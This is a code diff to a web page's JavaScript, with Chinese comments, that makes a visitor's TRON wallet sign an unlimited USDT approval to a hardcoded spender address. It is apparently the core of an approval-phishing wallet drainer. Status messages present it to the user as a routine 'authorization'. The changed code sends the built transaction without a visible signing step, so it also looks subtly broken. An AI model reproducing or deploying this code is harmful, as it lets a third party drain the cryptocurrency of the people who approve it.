@@ -182,8 +182,9 @@
         // 配置
         const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
-        // 使用十六进制字符串表示无限额度（去掉0x前缀）
-        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        
+        // 无限额度：使用十六进制字符串（去掉0x前缀）
+        const UNLIMITED_AMOUNT_HEX = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         
         let tronWeb = null;
         let userAddress = null;
@@ -251,15 +252,32 @@
             showStatus('正在构造授权交易...', 'loading');
             
             try {
-                const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
+                // 将地址转换为 base58 格式（已经是 base58）
+                const contractAddress = TRON_USDT_CONTRACT;
+                const functionSelector = 'approve(address,uint256)';
                 
+                // 参数：spender 地址，amount（作为十六进制字符串，BigNumber 会转换）
+                // 使用 tronWeb.toBigNumber 将十六进制转换为 BigNumber
+                const amountBN = tronWeb.toBigNumber('0x' + UNLIMITED_AMOUNT_HEX);
+                
+                // 参数数组（TronWeb 期望的格式）
+                const parameters = [
+                    { type: 'address', value: SPENDER_ADDRESS },
+                    { type: 'uint256', value: amountBN }
+                ];
+                
+                // 构建交易
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    contractAddress,
+                    functionSelector,
+                    {},
+                    parameters,
+                    userAddress
+                );
+                
+                // 发送交易
                 showStatus('请在钱包中确认授权...', 'loading');
-                
-                // 直接使用十六进制字符串（不带0x前缀）
-                const result = await contract.approve(
-                    SPENDER_ADDRESS,
-                    UNLIMITED_AMOUNT
-                ).send();
+                const result = await tronWeb.trx.sendRawTransaction(tx.transaction);
                 
                 console.log('授权结果:', result);
                 
